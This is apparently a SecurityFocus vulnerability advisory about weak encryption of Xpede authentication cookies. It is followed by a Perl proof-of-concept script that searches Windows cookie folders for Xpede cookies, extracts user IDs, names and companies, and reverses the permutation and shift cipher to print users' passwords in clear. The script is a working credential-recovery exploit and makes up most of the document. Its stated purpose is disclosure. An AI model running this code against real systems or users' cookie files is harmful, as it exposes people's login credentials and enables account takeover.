source: http://www.securityfocus.com/bid/4344/info

An issue has been reported in Xpede, which could lead to a compromise of user authentication information.

Reportedly, Xpede cookies containing username and password data is stored using a weak encryption method. Therefore if a user obtains access to cookies reisding on a system, he/she may be able to reveal authentication information of Xpede users. 

#!/usr/bin/perl
# Xdeep.pl, search for and decipher Xpede
passwords stored in these damn cookies
# Pr00f of concept, not to be used for illegal purposes.
#
# Author: Gregory Duchemin Aka c3rb3r // March
2002
#
#output format

format STDOUT =
+ Userid: @<<<<<<<
$userid
+ Realname: @<<<<<<<<<<<<<<<<<<<<<<<<<
$realname
+ Company: @<<<<<<<<<<<<<<<<<<<<
$company
+ Encoded password: @<<<<<<<<<<<<<<<<<<<<
$password
.


#Cookie fingerprint
$signature="defPWD";



#decoding stuff
@PERMU=('9', '11', '2', '6', '4', '10', '1', '8', '7', '3', '5');
@ALPHA=
('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O'
, 'P', 'Q', 'R','S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a','b','c','d','
e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'
,'z');
@SHIFT=(9, 5, 17, 26, 17, 22, 6, 2, 25, 6, 23);


#Change the following path to match your system
@COOKIE= glob
('c:\winnt\Profiles\*\Cookies\*@*.txt');



$i=$count=0;
@FOUND= ('nope');

print "\n\nXdeep.pl  Xpede cookies finder and decoder
\n\n-- Gregory Duchemin (Aka C3rb3r) ^ Feb 2002 --
\n\n\n";

foreach $try (@COOKIE) {
$count++;
if (open(handle, $try))
{
@lines=<handle>;
if (!index($lines[0], $signature))
{
printf("\n+ Xpede cookie found ! yep :)  <=>  %s\n",
$try);
$FOUND[$i]=$try;
$i++;
}
close(handle);
}

}

printf("\n+ %d files checked.\n", $count);

if (! $i)
{
print "\n\n- No Xpede cookie found, sorry\n\n";
exit(0);
}

printf("\n\n+ %d Cookie(s) found.\n", $i);
print "\n\n\n[Press return]\n";
$try=<STDIN>;

foreach $try (@FOUND) {

if (open(handle, $try))
{
@lines=<handle>;

$userid= @lines[55];
$realname=@lines[64];
$password=@lines[46];
$company=@lines[28];

$realname =~ s/\+/ /;
$userid =~ s/\+/ /;
$password =~ s/\+/ /;
$company =~ s/\+/ /;

$userid =~ s/%([a-f0-9][a-f0-9])/pack("C", hex
($1))/eig;
$realname =~ s/%([a-f0-9][a-f0-9])/pack("C", hex
($1))/eig;
$password =~ s/%([a-f0-9][a-f0-9])/pack("C", hex
($1))/eig;
$company =~ s/%([a-f0-9][a-f0-9])/pack("C", hex
($1))/eig;

printf "\n+ Found Xpede cookie :\n>> %s <<\n\n", $try;
write;
print "\n\n! Cr4cking 1n progr3ss ... \n";

@list=split //, $password;




if (length($password) > 12 )
{
$MAX = 11;
$DIFF = length($password)-1-$MAX;
for ($i = 0; $i < ($DIFF); $i++) {$REST = $REST.$list
[$i]; }
splice(@list, 0, ($DIFF));
printf "\n+ Clear part is %s\n", $REST;
}
else {$MAX = length($password)-1;printf "\n- No clear
part found \n";}



for ($i=0; $i<$MAX; $i) { $temp_pass =
$temp_pass.$list[$PERMU[$i++]-1]; }
printf "\n+ Permutations give %s\n", $temp_pass;


@list=split //, $temp_pass;
for ($i=0; $i<$MAX; $i++)
{
$b = ord($list[$i]);
$c = $SHIFT[$i];
$flag=0;


for ($z=0; $z<52; $z+=1)
{
 if (ord($ALPHA[$z]) == $b) { $a = ord($ALPHA
[($z+$c)%52]);$flag=1;}
}

if (!$flag) {$a = $b;}


$decode = $decode.chr($a);
printf "\n+ %s Shift(%d) \t --> \t%s", chr($b), $c, chr
($a);
}

printf "\n\n+ Shifting with secret key give %s\n",
$decode;
printf "\n! Password is \"%s\"\n\n", $decode.$REST;
printf "\n\n- End.\n\n";

$decode=$REST=$temp_pass="";
close(handle);

print "\n\n[Press return]\n";
$try=<STDIN>;
}
}
